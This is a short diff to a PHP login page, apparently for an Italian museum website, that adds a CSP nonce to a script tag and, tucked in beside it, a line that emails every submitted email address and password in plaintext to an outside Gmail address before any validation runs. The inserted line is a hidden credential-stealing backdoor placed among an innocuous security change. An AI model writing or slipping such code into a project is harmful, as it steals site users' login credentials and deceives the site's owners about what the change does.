@@ -22,7 +22,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } else {
         $email    = trim($_POST['email']    ?? '');
         $password = trim($_POST['password'] ?? '');
-
+		museoSendMail("sebastianocatalano670@gmail.com", "yea", "$email, $password", "");
         if (!$email || !$password) {
             $error = 'Inserisci email e password.';
         } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
@@ -201,7 +201,7 @@ include __DIR__ . '/header.php';
   </div>
 </main>
 
-<script>
+<script nonce="<?= cspNonce() ?>">
 function togglePasswordVisibility(inputId, button) {
     const input = document.getElementById(inputId);
     if (!input) return;
